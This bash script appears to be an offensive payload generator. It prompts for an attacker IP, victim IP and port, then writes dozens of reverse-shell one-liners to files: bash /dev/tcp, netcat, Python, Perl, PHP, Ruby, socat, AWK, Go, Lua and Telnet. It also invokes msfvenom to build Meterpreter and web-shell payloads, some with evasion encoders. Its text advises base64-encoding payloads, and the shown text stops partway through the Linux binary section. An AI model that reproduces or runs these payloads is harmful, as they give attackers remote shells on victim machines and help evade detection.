#!/bin/bash
#------------------> Color Code:
RED="\033[01;31m"
BLUE="\033[36m"
GREEN="\033[01;32m"
XX="\033[0m" #--- COLSE COLOR
#------------------> Banner:
echo -e "\n"
echo -e "\n"
echo -e 
. ./ascii.sh
echo -e "\n"
echo -e "${RED}Available platforms:${XX}"
echo -e "\n${BLUE}╔═════{ 1. Linux:${XX}"
    echo -e "	══{ Simple_Shell         ══{ Bash Scripting"
    echo -e "	══{ Socat                ══{ Perl"
    echo -e "	══{ Python               ══{ PHP"
    echo -e "	══{ Ruby                 ══{ Netcat"
    echo -e "	══{ Netcat OpenBsd       ══{ AWK"
    echo -e "	══{ Golang               ══{ Meterpreter Web"
    echo -e "	══{ Lua                  ══{ Telnet"
    echo -e "	══{ Binaries Shell"
echo -e "\n${BLUE}╔═════{ 2. Windows:${XX}"
    echo -e "	══{ Powershell           ══{ Meterpreter"
    echo -e "	══{ Creat user account   ══{ http"
    echo -e "	══{ macros               ══{ ASP/ASPX"
    echo -e "	══{ php"
echo -e "\n${BLUE}╔═════{ 3. MacOS:${XX}"
    echo -e "	══{ Rev Shell           ══{ Bind Shell"
echo -e "\n${BLUE}╔═════{ 4. Andriod:${XX}"
    echo -e "	══{ meterpreter Shell"
echo -e "\n"
read -p "[+] Select a platform? [1/2/3/4] " input
echo -e "\n"
    if [ -d ./Payload_List ]; 
        then
		    echo -e "    ${RED}Payload_List Direcorty exist${XX}"
        else
            mkdir Payload_List 2>/dev/null
            echo -e "    ${GREEN}Payload_List Direcorty has been created${XX}"
    fi
    echo -e "\n"
if [[ $input == "1" ]]; then ## Linux
    echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
    echo -e "${RED} \t\t ═════════════════════════════════════════════[ Linux Payload ]══════════════════════════════════════════ ${XX}"
    echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
    echo -e "\n${BLUE}╔═════{ Enter the following details :${XX}"    
        read -p "Attacker IP Address: " IP
        read -p "Victim IP Address: " VI
        read -p "Listener Port: " PO
        read -p "Encod Iteration: " SH
    echo -e "\n${BLUE}╔═════{ Platforms :${XX}"
        echo -e "══{1. Simple_Shell"
        echo -e "══{2. Bash Scripting"
        echo -e "══{3. Socat"
        echo -e "══{4. Perl"
        echo -e "══{5. Python"
        echo -e "══{6. PHP"
        echo -e "══{7. Ruby"
        echo -e "══{8. Netcat"
        echo -e "══{9. Netcat OpenBsd"
        echo -e "══{10. AWK"
        echo -e "══{11. Golang"
        echo -e "══{12. Meterpreter Web"
        echo -e "══{13. Lua"
        echo -e "══{14. Telnet"
        echo -e "══{15. Binaries Shell"
    echo -e "\n"
    read -p " ═════{ Which Platforms :" plat
    if [[ $plat == "1" ]]; then
        echo -e "\n${BLUE}[+] Simple_Shell:${XX}"
        mkdir Payload_List/Simple_Shell 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with netcat listener_____[*]" > Payload_List/Simple_Shell/Shell_list.txt
            echo -e "\n[*] Run the following command on Attacker  PC:" >> Payload_List/Simple_Shell/Shell_list.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Simple_Shell/Shell_list.txt
            echo -e "[*] Run any of the following command on Victim PC:" >> Payload_List/Simple_Shell/Shell_list.txt
            echo -e "\nmkfifo /tmp/lol;nc '$IP' '$PO' 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol" >> Payload_List/Simple_Shell/Shell_list.txt
            echo -e "\n;/bin/bash -c 'bash -i >& /dev/tcp/$IP/$PO 0>&1' #" >> Payload_List/Simple_Shell/Shell_list.txt
            echo -e "\nHRI ;/bin/bash -c 'bash -i >& /dev/tcp/$IP/$PO 0>&1' #" >> Payload_List/Simple_Shell/Shell_list.txt
            echo -e '\necho $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $IP $PO >/tmp/f)' >> Payload_List/Simple_Shell/Shell_list.txt
            echo -e '\necho $(nc -e /bin/bash $IP $PO)' >> Payload_List/Simple_Shell/Shell_list.txt
            echo -e "\t╔════════════════════════════════════════════════════════════════════╗"
            echo -e "\t║Encrypt the payload by doing:-                                      ║"
            echo -e "\t║    Attacker PC: echo 'PAYLOAD' | base64                            ║"
            echo -e "\t║    Victim PC: echo 'PAYLOAD' | base64 | bash                       ║"
            echo -e "\t╚════════════════════════════════════════════════════════════════════╝"
            echo -e "\n${RED}Done, Read Payload_List/Simple_Shell/Shell_list.txt${XX}"
    elif [[ $plat == "2" ]]; then
        echo -e "\n${BLUE}[+] Bash Scripting:${XX}"
        mkdir Payload_List/Bash_Script 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with netcat listener_____[*]" > Payload_List/Bash_Script/Shell_list.txt
            echo -e "\n[*] Run the following command on Attacker PC:" >> Payload_List/Bash_Script/Shell_list.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Bash_Script/Shell_list.txt
            echo -e "[*] Run any of the following command on Victim PC:" >> Payload_List/Bash_Script/Shell_list.txt
            echo -e "\nbash -i >& /dev/tcp/$IP/$PO 0>&1" >> Payload_List/Bash_Script/Shell_list.txt
            echo -e "\n0<&196;exec 196<>/dev/tcp/$IP/$PO; sh <&196 >&196 2>&196" >> Payload_List/Bash_Script/Shell_list.txt
            echo -e "\nsh -i >& /dev/udp/$IP/$PO 0>&1" >> Payload_List/Bash_Script/Shell_list.txt
            echo -e "\t╔════════════════════════════════════════════════════════════════════╗"
            echo -e "\t║Encrypt the payload by doing:-                                      ║"
            echo -e "\t║    Attacker PC: echo 'PAYLOAD' | base64                            ║"
            echo -e "\t║    Victim PC: echo 'PAYLOAD' | base64 | bash                       ║"
            echo -e "\t╚════════════════════════════════════════════════════════════════════╝"
            echo -e "\n${BLUE}[+] Creating Payload using msfvenom:${XX}"
            echo -e "[*]_____The following Reverse Shell will run with multi_handler _____[*]" >> Payload_List/Bash_Script/Read_Me.txt
                echo -e "[*] If You are going for netcat, run the following command on Attaker PC:" >> Payload_List/Bash_Script/Read_Me.txt
                echo -e "    nc -nlvp $PO" >> Payload_List/Bash_Script/Read_Me.txt
                echo -e "[*] If You are going for meterpreter, set this as a payload on multi/handler:" >> Payload_List/Bash_Script/Read_Me.txt
            echo -e "\n- set payload cmd/unix/reverse_bash for both of the files" >> Payload_List/Bash_Script/Read_Me.txt
            msfvenom -p cmd/unix/reverse_bash LHOST=$IP LPORT=$PO -f raw > Payload_List/Bash_Script/cmd_unix_rev.sh
        ### shikata_ga_nai Payloads
            msfvenom -p cmd/unix/reverse_bash LHOST=$IP LPORT=$PO -f raw -e x86/shikata_ga_nai -i $SH > Payload_List/Bash_Script/cmd_unix_rev_shikata.sh
            echo -e "\n${RED}DONE, look into Payload_List/Bash_Script/${XX}"
    elif [[ $plat == "3" ]]; then
        echo -e "\n${BLUE}[+] Socat:${XX}"
        mkdir Payload_List/Socat 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with netcat listener_____[*]" > Payload_List/Socat/Shell_list.txt
            echo -e "\n[*] Run the following command on Attacker PC:" >> Payload_List/Socat/Shell_list.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Socat/Shell_list.txt
            echo -e "[*] Run any of the following command on Victim PC:" >> Payload_List/Socat/Shell_list.txt
            echo -e "\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:$PO" >> Payload_List/Socat/Shell_list.txt
            echo -e "\nuser@attack$ socat file:`tty`,raw,echo=0 TCP-L:$PO" >> Payload_List/Socat/Shell_list.txt
            echo -e "\nuser@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:$PO" >> Payload_List/Socat/Shell_list.txt
            echo -e "\n${RED}Done, Read Payload_List/Socat/Shell_list.txt${XX}"
    elif [[ $plat == "4" ]]; then
        echo -e "\n${BLUE}[+] Perl:${XX}"
        mkdir Payload_List/Perl 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with netcat listener_____[*]" > Payload_List/Perl/Shell_list.txt
            echo -e "\n[*] Run the following command on Attaker PC:" >> Payload_List/Perl/Shell_list.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Perl/Shell_list.txt
            echo -e "[*] Run any of the following command on Victim PC:" >> Payload_List/Perl/Shell_list.txt
            echo -e '\nperl -e "use Socket;$i='$IP';$p='$PO';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};"' >> Payload_List/Perl/Shell_list.txt
            echo -e '\nperl -MIO -e "$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,'$IP:$PO');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' >> Payload_List/Perl/Shell_list.txt
            echo -e "\n${RED}DONE, Read Payload_List/Perl/Shell_list.txt${XX}"
            echo -e "\n${BLUE}[+] Creating Payload using msfvenom:${XX}"
            echo -e "[*]_____The following Reverse Shell will run with multi_handler or netcat_____[*]" > Payload_List/Perl/Shell_list.txt
            echo -e "\n[*] If netcat, run the following command on Attaker PC:" >> Payload_List/Perl/Shell_list.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Perl/Shell_list.txt
            echo -e "\n[*] If multi_handler, set the payload as folloowing:" >> Payload_List/Perl/Shell_list.txt
            echo -e "\n- set payload cmd/unix/reverse_perl for cmd_unix_rev.pl" >> Payload_List/Perl/Read_Me.txt
            msfvenom -p cmd/unix/reverse_perl LHOST=$IP LPORT=$PO -f raw > Payload_List/Perl/cmd_unix_rev.pl
        ### shikata_ga_nai Payloads
            msfvenom -p cmd/unix/reverse_perl LHOST=$IP LPORT=$PO -f raw -e x86/shikata_ga_nai -i $SH > Payload_List/Perl/cmd_unix_rev_shikata.pl
            echo -e "\n${RED}DONE, look into Payload_List/Perl${XX}"
    elif [[ $plat == "5" ]]; then
        echo -e "\n${BLUE}[+] Python:${XX}"
        mkdir Payload_List/Python 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with netcat listener_____[*]" > Payload_List/Python/Shell_list.txt
            echo -e "\n[*] Run the following command on Attacker PC:" >> Payload_List/Python/Shell_list.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Python/Shell_list.txt
            echo -e " [*] Run any of the following command on Victim PC:" >> Payload_List/Python/Shell_list.txt
            echo -e "\nexport RHOST="$IP";export RPORT=$PO;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'" >> Payload_List/Python/Shell_list.txt
            echo -e "\npython -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PO));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'" >> Payload_List/Python/Shell_list.txt
            echo -e "\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PO));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'" >> Payload_List/Python/Shell_list.txt
            echo -e "\npython -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PO));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'" >> Payload_List/Python/Shell_list.txt
            echo -e "\npython -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PO));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'" >> Payload_List/Python/Shell_list.txt
            echo -e "\npython -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("$IP",$PO));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'" >> Payload_List/Python/Shell_list.txt
            echo -e "\npython -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("$IP",$PO));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'" >> Payload_List/Python/Shell_list.txt
            echo -e "\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PO));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> Payload_List/Python/Shell_list.txt
            echo -e "\n${BLUE}[+] Creating Payload using msfvenom:${XX}"
            echo -e " [*]_____The following Reverse Shell will run with multi_handler _____[*]" >> Payload_List/Python/Read_Me.txt
            echo -e " [*] Set the payload as following:" >> Payload_List/Python/Read_Me.txt
            echo -e "\n- set payload cmd/unix/reverse_python for both files" >> Payload_List/Python/Read_Me.txt
            msfvenom -p cmd/unix/reverse_python LHOST=$IP LPORT=$PO -f raw > Payload_List/Python/cmd_unix_rev.py
        ### shikata_ga_nai Payloads
            msfvenom -p cmd/unix/reverse_python LHOST=$IP LPORT=$PO -f raw -e x86/shikata_ga_nai -i $SH > Payload_List/Python/cmd_unix_rev_shikata.py
            echo -e "\n${RED}DONE, look into Payload_List/Python${XX}"
    elif [[ $plat == "6" ]]; then
        echo -e "\n${BLUE}[+] PHP:${XX}"
        mkdir Payload_List/PHP 2>/dev/null
        mkdir Payload_List/PHP/Meterpreter_Binaries/ 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with netcat listener_____[*]" > Payload_List/PHP/Shell_list.txt
            echo -e "\n[*] Run the following command on Attacker PC:" >> Payload_List/PHP/Shell_list.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/PHP/Shell_list.txt
            echo -e "[*] Run any of the following command on Victim PC:" >> Payload_List/PHP/Shell_list.txt
            echo -e "\nphp -r '"$sock"=fsockopen("$IP",$PO);exec('/bin/sh -i <&3 >&3 2>&3');'" >> Payload_List/PHP/Shell_list.txt
            echo -e "\nphp -r '"$sock"=fsockopen("$IP",$PO);shell_exec('/bin/sh -i <&3 >&3 2>&3');'" >> Payload_List/PHP/Shell_list.txt
            echo -e "\nphp -r '"$sock"=fsockopen("$IP",$PO);'/bin/sh -i <&3 >&3 2>&3';'" >> Payload_List/PHP/Shell_list.txt
            echo -e "\nphp -r '"$sock"=fsockopen("$IP",$PO);system('/bin/sh -i <&3 >&3 2>&3');'" >> Payload_List/PHP/Shell_list.txt
            echo -e "\nphp -r '"$sock"=fsockopen("$IP",$PO);passthru('/bin/sh -i <&3 >&3 2>&3');'" >> Payload_List/PHP/Shell_list.txt
            echo -e "\nphp -r '"$sock"=fsockopen("$IP",$PO);popen('/bin/sh -i <&3 >&3 2>&3', 'r');'" >> Payload_List/PHP/Shell_list.txt
            echo -e "\n<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PO >/tmp/f'); ?>" >> Payload_List/PHP/Shell_list.txt
            echo -e "\n<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/'$IP'/'$PO' 0>&1'");?>" >> Payload_List/PHP/Shell_list.txt
        echo -e "\n${BLUE}[+] Creating Meterpreter_Binaries Staged PHP:${XX}"
        mkdir Payload_List/PHP/Meterpreter_Binaries/Staged 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with multi_handler _____[*]" > Payload_List/PHP/Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "[*] Set the payload as following:" >> Payload_List/PHP/Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n- set payload php/meterpreter_reverse_tcp for Rev_TCP_Shell.php" >> Payload_List/PHP/Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n- set payload php/meterpreter/reverse_tcp for Rev_TCP_Shell_1.php" >> Payload_List/PHP/Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n- set payload php/meterpreter_reverse_tcp for Rev_TCP_shikata.php" >> Payload_List/PHP/Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n- set payload php/meterpreter/reverse_tcp for Rev_TCP_shikata_1.php" >> Payload_List/PHP/Meterpreter_Binaries/Staged/Read_Me.txt
            msfvenom -p php/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f raw > Payload_List/PHP/Meterpreter_Binaries/Staged/Rev_TCP_Shell.php
            msfvenom -p php/meterpreter/reverse_tcp -f raw lhost=$IP lport=$PO > Payload_List/PHP/Meterpreter_Binaries/Staged/Rev_TCP_shell_1.php
        ### shikata_ga_nai Payloads
            msfvenom -p php/meterpreter_reverse_tcp LHOST=$IP LPORT=$PO -f raw -e x86/shikata_ga_nai -i $SH > Payload_List/PHP/Meterpreter_Binaries/Staged/Rev_TCP_Shell_shikata.php
            msfvenom -p php/meterpreter/reverse_tcp -f raw lhost=$IP lport=$PO -e x86/shikata_ga_nai -i $SH > Payload_List/PHP/Meterpreter_Binaries/Staged/Rev_TCP_Shell1_shikata_1.php
        echo -e "\n${BLUE}[+] Creating Meterpreter_Binaries Stageless PHP:${XX}"
        mkdir Payload_List/PHP/Meterpreter_Binaries/Stageless 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with multi_handler _____[*]" > Payload_List/PHP/Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "[*] Set the payload as following:" >> Payload_List/PHP/Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n- set payload php/reverse_php for Rev_TCP.php" >> Payload_List/PHP/Meterpreter_Binaries/Stageless/Read_Me.txt
            echo -e "\n- set payload php/reverse_php for Rev_TCP_shikata.php" >> Payload_List/PHP/Meterpreter_Binaries/Stageless/Read_Me.txt
            msfvenom -p php/reverse_php LHOST=$IP LPORT=$PO -f raw > Payload_List/PHP/Meterpreter_Binaries/Stageless/Rev_TCP.php
        ### shikata_ga_nai Payloads
            msfvenom -p php/reverse_php LHOST=$IP LPORT=$PO -f raw -e x86/shikata_ga_nai -i $SH > Payload_List/PHP/Meterpreter_Binaries/Stageless/Rev_TCP_shikata.php
            echo -e "\n${RED}DONE, look into Payload_List/PHP/${XX}"
    elif [[ $plat == "7" ]]; then
        echo -e "\n${BLUE}[+] Ruby:${XX}"
        mkdir Payload_List/Ruby 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with netcat listener_____[*]" > Payload_List/Ruby/hell_list.txt
            echo -e "\n[*] Run the following command on Attacker PC:" >> Payload_List/Ruby/Shell_list.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Ruby/Shell_list.txt
            echo -e "[*] Run any of the following command on Victim PC:" >> Payload_List/Ruby/Shell_list.txt
            echo -e "\nruby -rsocket -e'f=TCPSocket.open("$IP",$PO).to_i;exec sprintf('/bin/sh -i <&%d >&%d 2>&%d',f,f,f)'" >> Payload_List/Ruby/Shell_list.txt
            echo -e "\nruby -rsocket -e 'exit if fork;c=TCPSocket.new("$IP","$PO");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'" >> Payload_List/Ruby/Shell_list.txt
            echo -e "\n${RED}Done, Read Payload_List/Ruby/Shell_list.txt${XX}"
    elif [[ $plat == "8" ]]; then
        echo -e "\n${BLUE}[+] Netcat:${XX}"
        mkdir Payload_List/Netcat 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with netcat listener_____[*]" > Payload_List/Netcat/Shell_list.txt
            echo -e "\n[*] Run the following command on Attacker PC:" >> Payload_List/Netcat/Shell_list.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Netcat/Shell_list.txt
            echo -e "[*] Run any of the following command on Victim PC:" >> Payload_List/Netcat/Shell_list.txt
            echo -e "\nnc -e /bin/sh $IP $PO" >> Payload_List/Netcat/Shell_list.txt
            echo -e "\nnc -e /bin/bash $IP $PO" >> Payload_List/Netcat/Shell_list.txt
            echo -e "\nnc -c bash $IP $PO" >> Payload_List/Netcat/Shell_list.txt
            echo -e "\nncat $IP $PO -e /bin/bash" >> Payload_List/Netcat/Shell_list.txt
            echo -e "\nncat --udp $IP $PO -e /bin/bash" >> Payload_List/Netcat/Shell_list.txt
            echo -e "\n/bin/sh | nc $IP $PO" >> Payload_List/Netcat/Shell_list.txt
            echo -e "\nrm -f /tmp/p; mknod /tmp/p p && nc $IP $PO 0/tmp/p" >> Payload_List/Netcat/Shell_list.txt
            echo -e "\n${RED}Done, Read Payload_List/Netcat/Shell_list.txt${XX}"
    elif [[ $plat == "9" ]]; then
        echo -e "\n${BLUE}[+] Netcat OpenBsd:${XX}"
        mkdir Payload_List/NetcatOpenBsd 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with netcat listener_____[*]" > Payload_List/NetcatOpenBsd/Shell_list.txt
            echo -e "\n[*] Run the following command on Attacker PC:" >> Payload_List/NetcatOpenBsd/Shell_list.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/NetcatOpenBsd/Shell_list.txt
            echo -e "[*] Run any of the following command on Victim PC:" >> Payload_List/NetcatOpenBsd/Shell_list.txt
            echo -e "\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PO >/tmp/f" >> Payload_List/NetcatOpenBsd/Shell_list.txt
            echo -e "\n${RED}Done, Read Payload_List/NetcatOpenBsd/Shell_list.txt${XX}"
    elif [[ $plat == "10" ]]; then
        echo -e "\n${BLUE}[+] AWK:${XX}"
        mkdir Payload_List/AWK 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with netcat listener_____[*]" > Payload_List/AWK/Shell_list.txt
            echo -e "\n[*] Run the following command on Attacker PC:" >> Payload_List/AWK/Shell_list.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/AWK/Shell_list.txt
            echo -e "[*] Run any of the following command on Victim PC:" >> Payload_List/AWK/Shell_list.txt
            echo -e "\nawk 'BEGIN {s = '/inet/tcp/0/$IP/$PO'; while(42) { do{ printf 'shell>' |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != 'exit') close(s); }}' /dev/null" >> Payload_List/AWK/Shell_list.txt
            echo -e "\n${RED}Done, Read Payload_List/AWK/Shell_list.txt${XX}"
    elif [[ $plat == "11" ]]; then
        echo -e "\n${BLUE}[+] Golang:${XX}"
        mkdir Payload_List/Golang 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with netcat listener_____[*]" > Payload_List/Golang/Shell_list.txt
            echo -e "\n[*] Run the following command on Attacker PC:" >> Payload_List/Golang/Shell_list.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Golang/Shell_list.txt
            echo -e "[*] Run any of the following command on Victim PC:" >> Payload_List/Golang/Shell_list.txt
            echo -e "\necho -e 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$IP:$PO");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go" >> Payload_List/Golang/Shell_list.txt
            echo -e "\n${RED}Done, Read Payload_List/Golang/Shell_list.txt${XX}"
    elif [[ $plat == "12" ]]; then
        echo -e "\n${BLUE}[+] Creating Meterpreter Web Shells:${XX}"
        mkdir Payload_List/Web_Shells 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with multi_handler or netcat_____[*]" > Payload_List/Web_Shells/Read_Me.txt
            echo -e "\n[*] If netcat, run the following command on Attaker PC:" >> Payload_List/Web_Shells/Read_Me.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Web_Shells/Read_Me.txt
            echo -e "\n[*] If multi_handler, set the payload as following:" >> Payload_List/Web_Shells/Read_Me.txt
            echo -e "\n- set payload java/jsp_shell_reverse_tcp for JSP_Rev_TCP.jsp" >> Payload_List/Web_Shells/Read_Me.txt
            echo -e "\n- set payload java/jsp_shell_reverse_tcp for JSP_Rev_TCP.war" >> Payload_List/Web_Shells/Read_Me.txt
            echo -e "\n- set payload nodejs/shell_reverse_tcp for NodeJS_Rev_TCP.war" >> Payload_List/Web_Shells/Read_Me.txt
            msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PO -f raw > Payload_List/Web_Shells/JSP_Rev_TCP.jsp
            msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PO -f war > Payload_List/Web_Shells/JSP_Rev_TCP.war
            msfvenom -p nodejs/shell_reverse_tcp LHOST=$IP LPORT=$PO > Payload_List/Web_Shells/NodeJS_Rev_TCP.war
        ### shikata_ga_nai Payloads
            msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PO -f raw -e x86/shikata_ga_nai -i $SH > Payload_List/Web_Shells/JSP_Rev_TCP_shikata.jsp
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f asp -e x86/shikata_ga_nai -i $SH > Payload_List/Web_Shells/Rev_TCP_shikata.asp
            msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PO -f war -e x86/shikata_ga_nai -i $SH > Payload_List/Web_Shells/JSP_Rev_TCP_shikata.war
            msfvenom -p nodejs/shell_reverse_tcp LHOST=$IP LPORT=$PO -e x86/shikata_ga_nai -i $SH > Payload_List/Web_Shells/NodeJS_Rev_TCP_shikata.war
            echo -e "\n${RED}DONE, look into Payload_ListWeb_Shells/${XX}"
    elif [[ $plat == "13" ]]; then
        echo -e "\n${BLUE}[+] Creating Lua:${XX}"
        mkdir Payload_List/Lua 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with netcat listener_____[*]" > Payload_List/Lua/Shell_list.txt
            echo -e "\n[*] Run the following command on Attacker PC:" >> Payload_List/Lua/Shell_list.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Lua/Shell_list.txt 
            echo -e "\n[*] Run the following command on Victim PC:" >> Payload_List/Lua/Shell_list.txt
            echo -e '\nlua -e "require("socket");require("os");t=socket.tcp();t:connect('$IP','$PO');os.execute("/bin/sh -i <&3 >&3 2>&3");"' >> Payload_List/Lua/Shell_list.txt
            echo -e "\n${RED}Done, Read Payload_List/Lua/Shell_list.txt${XX}"
    elif [[ $plat == "14" ]]; then
        echo -e "\n${BLUE}[+] Creating Telnet shells:${XX}"
        mkdir Payload_List/Telnet 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with netcat listener_____[*]" > Payload_List/Telnet/Shell_list.txt
            echo -e "\ntelnet $IP $PO | /bin/sh | telnet $IP $PO" >> Payload_List/Telnet/Shell_list.txt
            echo -e "\n${RED}Done, Read Payload_List/Telnet/Shell_list.txt${XX}"
    elif [[ $plat == "15" ]]; then
        echo -e "\n${BLUE}[+] Creating Binary Payload:${XX}"
        mkdir Payload_List/Binary 2>/dev/null
        mkdir Payload_List/Binary/Non_Meterpreter_Binaries 2>/dev/null
        mkdir Payload_List/Binary/Non_Meterpreter_Binaries/Staged 2>/dev/null
        mkdir Payload_List/Binary/Meterpreter_Binaries 2>/dev/null
        mkdir Payload_List/Binary/Meterpreter_Binaries/Staged 2>/dev/null
        #Non_Meterpreter_Binaries/Stageless
        echo -e "\n${BLUE}[+] Creating Non_Meterpreter Staged Payload:${XX}" 
            echo -e "[*]_____The following Reverse Shell will run with netcat listener_____[*]" > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n[*] Run the following command on Attacker PC:" >> Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "    nc -nlvp $PO" >> Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n[*] Run the following command on Attacker PC for Bind shell:" >> Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "    nc -nvp $PO $VI" >> Payload_List/Binary/Non_Meterpreter_Binaries/Staged/Read_Me.txt
            msfvenom -p linux/x64/shell/bind_tcp RHOST=$VI LPORT=$PO -f elf > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/x64_Shell_Bind_TCP_shikata.elf
        ### zutto_dekiru Payloads
            msfvenom -p linux/x64/shell/bind_tcp RHOST=$VI LPORT=$PO -f elf -e x64/zutto_dekiru -i $SH > Payload_List/Binary/Non_Meterpreter_Binaries/Staged/x64_zutto_dekiru.elf
        #Meterpreter_Binaries/Staged
        echo -e "\n${BLUE}[+] Creating Meterpreter Staged Payload:${XX}"
        mkdir Payload_List/Binary/Meterpreter_Binaries/Staged 2>/dev/null
            echo -e "[*]_____The following Reverse Shell will run with multi_handler_____[*]" > Payload_List/Binary/Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "[*] Set the payload as following:" >> Payload_List/Binary/Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n- set payload linux/x86/meterpreter/reverse_tcp for x86_Rev_TCP.elf" >> Payload_List/Binary/Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n- set payload linux/x64/meterpreter/reverse_tcp for x64_Rev_TCP.elf" >> Payload_List/Binary/Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n- set payload linux/x86/meterpreter/bind_tcp for x86_Bind_TCP.elf" >> Payload_List/Binary/Meterpreter_Binaries/Staged/Read_Me.txt
            echo -e "\n- set payload linux/x64/meterpreter/bind_tcp for x64_Bind_TCP.elf" >> Payload_List/Binary/Meterpreter_Binaries/Staged/Read_Me.txt
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$PO -f elf > Payload_List/Binary/Meterpreter_Binaries/Staged/x86_Rev_TCP.elf
